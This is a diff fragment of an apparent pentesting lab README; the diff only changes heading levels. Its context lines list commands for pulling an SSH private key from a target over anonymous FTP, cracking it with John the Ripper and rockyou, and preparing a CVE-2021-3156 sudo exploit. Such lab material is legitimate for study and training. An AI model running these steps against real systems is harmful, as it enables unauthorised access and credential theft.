@@ -72,7 +72,7 @@ Set up new user
 
 Instruction for PENTESTING
 ----------
-## GET ssh id_rsa from FTP
+### GET ssh id_rsa from FTP
 ```
 ftp <IP_target>
 username: anonymous
@@ -83,7 +83,7 @@ exit
 chmod 600 id_rsa
 ```
 
-## "Crack" ssh key with John The Ripper
+### "Crack" ssh key with John The Ripper
 ```
 $ locate ssh2john.py
 $ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash 
@@ -92,7 +92,7 @@ $ gunzip rockyou.txt.gz
 $ john id_rsa.hash -wordlist= rockyou.txt
 ```
 
-## CVE-2021-3156
+### CVE-2021-3156
 - directory contains `hac.c`, `lib.c`, `Makefile`, `README.md`
 ```
 $ cd /home/<username>/CVE-2021-3156/
